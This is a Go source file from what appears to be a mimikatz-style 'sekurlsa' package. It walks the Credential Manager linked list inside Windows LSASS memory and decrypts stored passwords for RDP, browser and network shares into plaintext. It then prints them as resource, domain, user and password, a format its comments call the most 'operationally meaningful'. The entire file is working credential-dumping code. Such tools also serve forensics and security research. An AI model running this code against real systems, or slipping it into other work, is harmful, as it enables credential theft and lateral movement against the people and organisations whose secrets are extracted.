package sekurlsa

import (
	"fmt"
)

// CredManLayout captures per-build offsets inside a single
// KIWI_LSA_DPAPI_CREDMAN_LIST node. The CredMan walker is invoked
// from the MSV walk via MSVLayout.CredManListPtrOffset — there is
// no separate dll-global list for this provider, only a per-session
// pointer chain.
//
// Set NodeSize=0 to disable. Operators on builds where KvcForensic /
// pypykatz haven't published verified offsets register their own
// values via an extended Template (or override our defaults).
type CredManLayout struct {
	NodeSize uint32

	// UNICODE_STRING fields inside the node.
	UserNameOffset    uint32
	LogonDomainOffset uint32
	PasswordOffset    uint32 // encrypted; same lsaKey decrypt as MSV
	ResourceNameOffset uint32 // target resource (e.g., "TERMSRV/server")
}

// CredManCredential is one entry from a session's Credential Manager
// (Vault) list. CredMan stores RDP-saved sessions, IE/Edge form
// passwords, network-share credentials, and any other CredentialAdd
// (advapi32) entry whose persistence type is LOGON_SESSION.
//
// Password is the plaintext after LSA decrypt. ResourceName is the
// "target" string the application supplied at credential-save time
// — useful for filtering ("only TERMSRV/* credentials", etc.).
type CredManCredential struct {
	UserName     string
	LogonDomain  string
	Password     string
	ResourceName string
	Found        bool
}

// AuthPackage satisfies the Credential interface.
func (CredManCredential) AuthPackage() string { return "CredMan" }

// String renders ResourceName | Domain\User:Password — the resource
// is the most operationally meaningful field (tells the caller
// *what* the credential unlocks).
func (c CredManCredential) String() string {
	user := c.UserName
	if c.LogonDomain != "" {
		user = c.LogonDomain + `\` + user
	}
	if c.ResourceName != "" {
		return fmt.Sprintf("%s | %s:%s", c.ResourceName, user, c.Password)
	}
	return fmt.Sprintf("%s:%s", user, c.Password)
}

// wipe satisfies the optional wipe interface that Result.Wipe calls.
func (c *CredManCredential) wipe() {
	c.Password = ""
	c.Found = false
}

// extractCredMan walks a per-session CredMan list. The list head is
// the value at sessionNodeBytes[CredManListPtrOffset:+8] — the
// caller (decodeLogonSession) reads it then passes us the resulting
// VA. Returns one CredManCredential per node that produced a
// non-empty plaintext.
//
// Returns (nil, "") when the layout is disabled (NodeSize==0) or
// when the listHeadPtr is zero (session has no CredMan entries).
func extractCredMan(r *reader, listHeadPtr uint64, layout CredManLayout, lsaKey *lsaKey) ([]CredManCredential, []string) {
	if layout.NodeSize == 0 || listHeadPtr == 0 {
		return nil, nil
	}
	var out []CredManCredential
	const maxNodes = 256
	warnings := walkLinkedList(r, listHeadPtr, layout.NodeSize, maxNodes,
		func(node []byte, _ uint64) string {
			if c, ok := decodeCredManNode(r, node, layout, lsaKey); ok {
				out = append(out, c)
			}
			return ""
		})
	return out, warnings
}

// decodeCredManNode projects a node-bytes blob through the layout
// to a CredManCredential. Returns ok=false on any read failure or
// a fully-empty node (no Resource + no UserName + no Password).
func decodeCredManNode(r *reader, node []byte, layout CredManLayout, lsaKey *lsaKey) (CredManCredential, bool) {
	if uint32(len(node)) < layout.NodeSize {
		return CredManCredential{}, false
	}

	username := readUnicodeStringIfFits(r, node, layout.UserNameOffset, layout.NodeSize)
	domain := readUnicodeStringIfFits(r, node, layout.LogonDomainOffset, layout.NodeSize)
	resource := readUnicodeStringIfFits(r, node, layout.ResourceNameOffset, layout.NodeSize)

	var password string
	if layout.PasswordOffset+16 <= layout.NodeSize {
		password, _ = readEncryptedPassword(r, node[layout.PasswordOffset:layout.PasswordOffset+16], lsaKey)
	}

	c := CredManCredential{
		UserName:     username,
		LogonDomain:  domain,
		Password:     password,
		ResourceName: resource,
		Found:        username != "" || password != "" || resource != "",
	}
	return c, c.Found
}

